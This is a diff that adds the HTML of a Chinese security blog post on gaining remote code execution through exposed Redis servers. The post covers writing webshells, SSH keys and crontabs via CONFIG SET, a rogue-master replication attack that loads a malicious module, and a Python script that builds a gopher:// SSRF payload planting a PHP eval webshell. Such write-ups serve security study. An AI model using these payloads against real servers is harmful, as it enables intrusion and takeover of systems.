@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    redis rce | 道萝岗特森&#39;s Blog
+  </title>
+  <meta name="description" content="hello world">
+  
+  <meta name="keywords" content="
+  技术总结,redis
+  ">
+  
+  <meta name="author" content="daolgts">
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+<script>
+  var _hmt = _hmt || [];
+  (function(){var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
+    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
+</script>
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+</head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">This website</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        <!--  -->
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+          <li><a href="/links">Links</a></li>
+        
+        
+          <li><a href="/about">About</a></li>
+        
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 42 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 22 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 0 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">道萝岗特森&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    daolgts
+
+    <span class="post-date float-right" title="{{moment(1570687200000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1570687200000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>redis rce</h1>
+    <h1 id="redis-rce"><a href="#redis-rce" class="headerlink" title="redis rce"></a>redis rce</h1><h2 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h2><h3 id="redis-简介"><a href="#redis-简介" class="headerlink" title="redis 简介"></a>redis 简介</h3><blockquote>
+<p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。<br>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
+</blockquote>
+<h3 id="redis-命令"><a href="#redis-命令" class="headerlink" title="redis 命令"></a>redis 命令</h3><p><code>CONFIG SET</code> 命令可以动态地调整 Redis 服务器的配置(configuration)而无须重启</p>
+<p><code>CONFIG GET dir</code> 获取redis目录</p>
+<p><code>CONFIG GET dbfilename</code> 获取rdb文件名</p>
+<p><code>SET</code>,<code>GET</code> 设置和查看一个 key 的 value</p>
+<p><code>SLAVEOF</code> 命令为 redis 设置主服务器</p>
+<h3 id="redis协议规范-RESP"><a href="#redis协议规范-RESP" class="headerlink" title="redis协议规范(RESP)"></a>redis协议规范(RESP)</h3><p>Redis Serialization Protocol (Redis序列化协议)</p>
+<p><a href="https://redis.io/topics/protocol" target="_blank" rel="noopener">https://redis.io/topics/protocol</a></p>
+<p>该协议是用于与Redis服务器通信的</p>
+<h3 id="redis模块"><a href="#redis模块" class="headerlink" title="redis模块"></a>redis模块</h3><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的 redis 命令，通过写c语言并编译出.so文件。</p>
+<p>编写恶意so文件的代码</p>
+<p><a href="https://github.com/RicterZ/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p>
+<h3 id="redis-未授权访问"><a href="#redis-未授权访问" class="headerlink" title="redis 未授权访问"></a>redis 未授权访问</h3><p>Redis因配置不当可以未授权访问</p>
+<p>redis3.2版本后新增 <code>protected-mode</code> 配置，默认是 yes，即开启,外部网络无法连接 redis 服务</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>从官网(<a href="https://redis.io/download" target="_blank" rel="noopener">https://redis.io/download</a>)下载源码编译 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line">$ tar xzf redis-5.0.5.tar.gz</span><br><span class="line">$ cd redis-5.0.5</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
+
+<p>编辑 <code>redis.conf</code> 文件，注释掉 <code>bind 127.0.0.1</code>， 将 <code>protected-mode</code> 修改为 no ，启动redis-server <code>./src/redis-server</code></p>
+<p>然后就可以从外部网络连接 redis 服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.214.145</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01-写入文件-GetShell"><a href="#0x01-写入文件-GetShell" class="headerlink" title="0x01 写入文件 GetShell"></a>0x01 写入文件 GetShell</h2><p>redis 保存的数据并只是设置的 value，写入的文件都会有大量的无用数据</p>
+<p>但webshell、ssh 公钥、crontab 这样的文件都有一定容错性，能够成功使用</p>
+<ul>
+<li>写 webshell</li>
+<li>写 ssh 公钥</li>
+<li>写 crontab 计划任务 </li>
+</ul>
+<p><img src="https://s2.ax1x.com/2019/10/10/uT5gAI.png" alt="uT5gAI.png"></p>
+<h2 id="0x02-主从复制-GetShell"><a href="#0x02-主从复制-GetShell" class="headerlink" title="0x02 主从复制 GetShell"></a>0x02 主从复制 GetShell</h2><p>Redis提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写</p>
+<p>可以自己搭建一个 rogue redis 服务器，然后在目标 redis 上利用slaveof 做主从同步</p>
+<p>利用 <code>FULLRESYNC</code> 机制（需要全量复制）完全可控文件的内容，结合加载恶意 redis 模块，实现 rce</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">设置 slave</span><br><span class="line">SLAVEOF server port</span><br><span class="line"></span><br><span class="line">设置redis的数据库文件</span><br><span class="line"></span><br><span class="line">CONFIG SET dbfilename exp.so</span><br><span class="line"></span><br><span class="line">从rogue server接收module</span><br><span class="line"></span><br><span class="line">+FULLRESYNC &lt;Z*40&gt; 1\r\n$&lt;len&gt;\r\n&lt;payload&gt;</span><br><span class="line"></span><br><span class="line">加载模块</span><br><span class="line"></span><br><span class="line">MODULE LOAD ./exp.so</span><br></pre></td></tr></table></figure>
+
+<p>exp: </p>
+<ul>
+<li><a href="https://github.com/Ridter/redis-rce" target="_blank" rel="noopener">https://github.com/Ridter/redis-rce</a></li>
+<li><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server</a> </li>
+</ul>
+<h2 id="0x03-结合SSRF-Gopher协议"><a href="#0x03-结合SSRF-Gopher协议" class="headerlink" title="0x03 结合SSRF Gopher协议"></a>0x03 结合SSRF Gopher协议</h2><p>转换为gopher协议</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">""</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET[1]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"1.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-referer"><a href="#0x04-referer" class="headerlink" title="0x04 referer"></a>0x04 referer</h2><ul>
+<li><a href="https://xz.aliyun.com/t/5616" target="_blank" rel="noopener">https://xz.aliyun.com/t/5616</a></li>
+<li><a href="https://paper.seebug.org/975" target="_blank" rel="noopener">https://paper.seebug.org/975</a></li>
+<li><a href="https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/HkzsDzRxr#redis50-1day-%E5%88%A9%E7%94%A8" target="_blank" rel="noopener">https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/HkzsDzRxr#redis50-1day-%E5%88%A9%E7%94%A8</a></li>
+<li><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></li>
+</ul>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="https://daolgts.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 daolgts</li>
+      <li><a href="https://daolgts.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/daolgts">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
+      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+<script>
+  (function() {
+    var cx = '005157513716557594323:jvii0oiejlb';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+      '//cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
